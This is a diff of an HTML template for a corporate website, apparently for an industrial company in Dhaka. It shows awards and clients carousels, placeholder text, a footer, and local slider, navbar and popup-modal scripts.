+
+                                    <div class="carousel-item  ">
+                                        <div class="row align-items-center">
+
+                                            <div class="col achivement-items">
+                                                <div class="row">
+                                                    <div class="col-6">
+                                                        <img data-fancybox="gallery" data-animation-duration="700"
+                                                            data-src="#AwardISOCertification" href="javascript:;"
+                                                            class="card-img-top award" src="./images/3.jpg"
+                                                            alt="news" />
+
+                                                        <div style="display: none;" id="AwardISOCertification">
+
+                                                            <div
+                                                                class="row align-items-center sectionHalfHeight  animated fadeInDown">
+                                                                <div class="col-md-4">
+                                                                    <img class="img-fluid award-img"
+                                                                        src="storage/app/media/awards/award-hi-tech-industries.jpg"
+                                                                        alt="news" />
+                                                                </div>
+                                                                <div class="col">
+                                                                    <div class="card-block px-2">
+                                                                        <h3 class="card-title">
+                                                                            Lorem Ipsum is a doller sit ammet
+                                                                        </h3>
+                                                                        <p class="card-text">
+                                                                            Lorem ipsum dolor sit amet consectetur
+                                                                            adipisicing elit. Quam asperiores ab autem
+                                                                            minima pariatur doloremque harum eum nihil
+                                                                            quibusdam, excepturi commodi fugiat, est a!
+                                                                            Ipsam saepe aut magni eveniet qui.
+                                                                        </p>
+                                                                    </div>
+
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-6">
+                                                        <img data-fancybox="gallery" data-animation-duration="700"
+                                                            data-src="#AwardISOCertification" href="javascript:;"
+                                                            class="card-img-top award" src="./images/2.jpg"
+                                                            alt="news" />
+
+                                                        <div style="display: none;" id="AwardISOCertification">
+
+                                                            <div
+                                                                class="row align-items-center sectionHalfHeight  animated fadeInDown">
+                                                                <div class="col-md-4">
+                                                                    <img class="img-fluid award-img"
+                                                                        src="storage/app/media/awards/iso-9001-2008-iso-14001-2004-certified-01.png"
+                                                                        alt="news" />
+                                                                </div>
+                                                                <div class="col">
+                                                                    <div class="card-block px-2">
+                                                                        <h3 class="card-title">
+                                                                            ISO Certification
+                                                                        </h3>
+                                                                        <p class="card-text">
+                                                                            SSG recently achieved ISO 9000 & ISO 14000
+                                                                            certificate for significant performance in
+                                                                            quality management and environment
+                                                                            management. SSG never compromise with the
+                                                                            quality of its products. It always tries to
+                                                                            provide the best quality products to give
+                                                                            utmost satisfaction to valued customers.
+                                                                            This organization also concern for the
+                                                                            environment. So that it produces environment
+                                                                            friendly products by following proper
+                                                                            production guideline.</p>
+                                                                    </div>
+
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                                
+                                <!-- Left and right controls -->
+                                <a class="carousel-control-prev carousel_button" href="#">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+                                <a class="carousel-control-next carousel_button" href="#">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- Awards & Achivements Section End  -->
+             
+            <!-- Our Clients section -->
+            <section id="our-clients" data-aos="fade-up">
+                <div class="container">
+                    <div class="row  align-items-center sectionFullHeight2">
+                        <!--left content-->
+                        <div class="col-md-5">
+                            <h2>Our Valueable Clients</h2>
+                            <div class="title">
+                                OUR CLIENTS ARE OUR ASSETS
+                            </div>
+                            <div class="short-desc">
+                                <p>
+                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic aliquam quidem soluta
+                                    eius modi quas, quia magni ut earum provident quasi eos enim eaque doloremque
+                                    pariatur nemo eligendi quos! Deleniti!
+                                </p>
+                            </div>
+                        </div>
+                        <!--right content-->
+                        <div class="col-md-7">
+                            <div id="clientsCarousel" class="carousel slide" data-ride="carousel">
+                                <!-- The slideshow -->
+                                <div class="carousel-inner">
+                                    
+                                    <div class="carousel-item active">
+                                        <div class="row align-items-center">
+                                            <div class="col">
+                                                <img class="img-fluid" src="./images/6.webp" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="carousel-item ">
+                                        <div class="row align-items-center">
+
+                                            <div class="col">
+                                                <img class="img-fluid" src="./images/4.avif" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <!-- Left and right controls -->
+                                <a class="carousel-control-prev carousel_button" href="#">
+                                    <i class="fa fa-angle-left"></i>
+                                <a class="carousel-control-next carousel_button" href="#">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- Our Clients section end-->
+             
+            <!-- News & Events section -->
+            <section id="news-events" >
+                <div class="container-fluid">
+                    <div class="row  sectionFullHeight">
+                        <div class="col-md-12">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-md-7 d-flex justify-content-left">
+                                        <h2 class="section-title">News & events</h2>
+                                    </div>
+                                    <div class="col-md-5"></div>
+                                </div>
+                                <div class="row">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+            <!-- News & events section end-->
+        </section>
+        
+        <!-- Newsletter -->
+        <div class="download-newsletter" data-aos="fade-up">
+            <!-- Newsletter  section -->
+            <section id="newsletter" style="background-image: url(themes/ssg/assets/images/download/download-bg.jpg);">
+                <div class="container-fluid">
+                    <div class="row  align-items-center sectionHalfHeight">
+                        <div class="col">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col">
+                                        <div class="newletter">
+                                            <h2>
+                                                Download<br />
+                                                Newsletter
+                                            </h2>
+                                            <p class="title">
+                                                TO GET DETAIL PRODUCT AND ESSENTIAL COMPANY
+                                                INFORMATION<br><br><br>
+                                                <a href="#" class="submit-btn align-items-center" />View All</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
         </div>
-        <!-- Grid row -->
-            </div>     
-    </footer>
+        <!-- Newsletter section end-->
     </div>
     
+    <!-- Footer -->
+    <footer class="page-footer font-small mdb-color pt-4" data-aos="fade-up">
+        <!-- Footer Section start  -->
+        <!-- Footer Links -->
+        <div class="container text-center text-md-left">
+            <!-- Footer links -->
+            <div class="row text-center text-md-left mt-3 pb-3">
+                <!-- Grid column -->
+                <div class="col-md-2 col-lg-2 col-xl-2 mx-auto">
+                    <p class="mt-4">
+                        <i class="fas fa-home mr-3"></i> 
+                        Balaji Industries Limited. <br>
+                        Lilypond Center, 3 R.K Mission Road, Dhaka
+                    </p>
+                    <p>
+                        <i class="fas fa-envelope mr-3"></i> 
+                        info@example.com
+                    </p>
+                    <p>
+                        <i class="fas fa-phone mr-3"></i> 
+                        <a href="#"> 
+                            +8801607249358
+                        </a>
+                    </p>
+                </div>
+                <!-- Grid column -->
+                <hr class="w-100 clearfix d-md-none" />
+                <!-- Grid column -->
+                <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                    <h6 class="text-uppercase mb-4 font-weight-bold">About Us</h6>
+                    <p>
+                        <a href="#">Company Overview</a>
+                    </p>
+                    <p>
+                        <a href="#">Our Management</a>
+                    </p>
 
-    <!-- The Modal -->
+                </div>
+                <!-- Grid column -->
+                <hr class="w-100 clearfix d-md-none" />
+                <!-- Grid column -->
+                <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                    <h6 class="text-uppercase mb-4 font-weight-bold">Brands</h6>
+                    
+                    <p>
+                        <a href="#">Loream</a>
+                    </p>
+                    <p>
+                        <a href="#">Ipsum</a>
+                    </p>
+                    <p>
+                        <a href="#">Dolor</a>
+                    </p>
+                    <p>
+                        <a href="#">Sit</a>
+                    </p>
+                </div>
+                <!-- Grid column -->
+            </div>
+            <!-- Footer links -->
+            <hr />
+            <!-- Grid row -->
+            <div class="row d-flex align-items-center">
+                <!-- Grid column -->
+                <div class="col-md-7 col-lg-8">
+                    <!--Copyright-->
+                    <p class="text-center text-md-left">
+                        © 2025 Copyright:
+                        <a href="index.html#">
+                            <strong> Your Company.com</strong>
+                        </a>
+                    </p>
+                </div>
+                <!-- Grid column -->
+
+                <!-- Grid column -->
+
+                <!-- Grid column -->
+            </div>
+            <!-- Grid row -->
+        </div>
+    </footer>
+    </div>
+
+
+    <!-- popup modal onload -->
     <!-- <div id="myModal" class="popupModal">
       <span class="close">&times;</span>
-      <img class="popupModal-content" id="img01"> 
+      <img src="images/1.jpg" class="popupModal-content" id="img01"> 
     </div> -->
-    <!--
-     jQuery first, then Popper.js, then Bootstrap JS
-    -->
-
     
-   <!-- lightbox-->
+    <!-- lightbox-->
     <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.tools.min.js"></script>
-    
-    
     <!-- cdnjs -->
     <script>
-      AOS.init({
-          duration: 1000
-          
-    });
+        AOS.init({
+            duration: 1000
+
+        });
     </script>
-    
-    
-        <!-- REVOLUTION JS FILES -->
+
+
+    <!-- REVOLUTION JS FILES -->
     <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.tools.min.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.revolution.min.js"></script>
 
@@ -1136,13 +1040,13 @@
                     f = 0,
                     s = 0,
                     h = 0;
-                if (e.responsiveLevels && (jQuery.each(e.responsiveLevels, function(e, f) {
-                        f > i && (t = r = f, l = e), i > f && f > r && (r = f, n = e)
-                    }), t > r && (l = n)), f = e.gridheight[l] || e.gridheight[0] || e.gridheight, s = e.gridwidth[l] || e.gridwidth[0] || e.gridwidth, h = i / s, h = h > 1 ? 1 : h, f = Math.round(h * f), "fullscreen" == e.sliderLayout) {
+                if (e.responsiveLevels && (jQuery.each(e.responsiveLevels, function (e, f) {
+                    f > i && (t = r = f, l = e), i > f && f > r && (r = f, n = e)
+                }), t > r && (l = n)), f = e.gridheight[l] || e.gridheight[0] || e.gridheight, s = e.gridwidth[l] || e.gridwidth[0] || e.gridwidth, h = i / s, h = h > 1 ? 1 : h, f = Math.round(h * f), "fullscreen" == e.sliderLayout) {
                     var u = (e.c.width(), jQuery(window).height());
                     if (void 0 != e.fullScreenOffsetContainer) {
                         var c = e.fullScreenOffsetContainer.split(",");
-                        if (c) jQuery.each(c, function(e, i) {
+                        if (c) jQuery.each(c, function (e, i) {
                             u = jQuery(i).length > 0 ? u - jQuery(i).outerHeight(!0) : u
                         }), e.fullScreenOffset.split("%").length > 1 && void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 ? u -= jQuery(window).height() * parseInt(e.fullScreenOffset, 0) / 100 : void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 && (u -= parseInt(e.fullScreenOffset, 0))
                     }
@@ -1156,10 +1060,10 @@
             }
         };
     </script>
-     <script type="text/javascript">
+    <script type="text/javascript">
         var revapi1,
             tpj;
-        (function() {
+        (function () {
             if (!/loaded|interactive|complete/.test(document.readyState)) document.addEventListener("DOMContentLoaded", onLoad);
             else onLoad();
 
@@ -1232,63 +1136,58 @@
         }()); /* END OF WRAPPING FUNCTION */
     </script>
     <script>
-        window.onscroll = function() {myFunction()};
+        window.onscroll = function () { myFunction() };
         var navbar = document.getElementById("header");
         var sticky = navbar.offsetTop;
-        
+
         function myFunction() {
-          if (window.pageYOffset >= sticky) {
-            navbar.classList.add("sticky")
-          } else {
-            navbar.classList.remove("sticky");
-          }
+            if (window.pageYOffset >= sticky) {
+                navbar.classList.add("sticky")
+            } else {
+                navbar.classList.remove("sticky");
+            }
         }
     </script>
-     <script>
+    <script>
         $(".carousel").swipe({
-        
-          swipe: function(event, direction, distance, duration, fingerCount, fingerData) {
-        
-            if (direction == 'left') $(this).carousel('next');
-            if (direction == 'right') $(this).carousel('prev');
-        
-          },
-          allowPageScroll:"vertical"
-        
+
+            swipe: function (event, direction, distance, duration, fingerCount, fingerData) {
+
+                if (direction == 'left') $(this).carousel('next');
+                if (direction == 'right') $(this).carousel('prev');
+
+            },
+            allowPageScroll: "vertical"
+
         });
 
         $('.slide-item').addClass('img-fluid');
     </script>
-    
-    
+
     <script>
-    // Get the modal
-    console.log('ddddddddddd');
-    var modal = document.getElementById("myModal");
-     
-    var img = document.getElementById("popMakerMyImg");
-    var modalImg = document.getElementById("img01"); 
-    
-    // Automatically open the modal and set the image source
-    window.onload = function() {
-        console.log('window-onload');
-      modal.style.display = "block";
-      modalImg.src = img.src;
-    }
-    
-    // Get the <span> element that closes the modal
-    var span = document.getElementsByClassName("close")[0];
-    
-    // When the user clicks on <span> (x), close the modal
-    span.onclick = function() { 
-      modal.style.display = "none";
-    }
+        // Get the modal
+        console.log('ddddddddddd');
+        var modal = document.getElementById("myModal");
+
+        var img = document.getElementById("popMakerMyImg");
+        var modalImg = document.getElementById("img01");
+
+        // Automatically open the modal and set the image source
+        window.onload = function () {
+            console.log('window-onload');
+            modal.style.display = "block";
+            modalImg.src = img.src;
+        }
+
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function () {
+            modal.style.display = "none";
+        }
     </script>
 
-   
-        <script src="modules/system/assets/js/framework.combined-min.js"></script>
-<link rel="stylesheet" property="stylesheet" href="modules/system/assets/css/framework.extras-min.css">
-            
 
 </body>
 
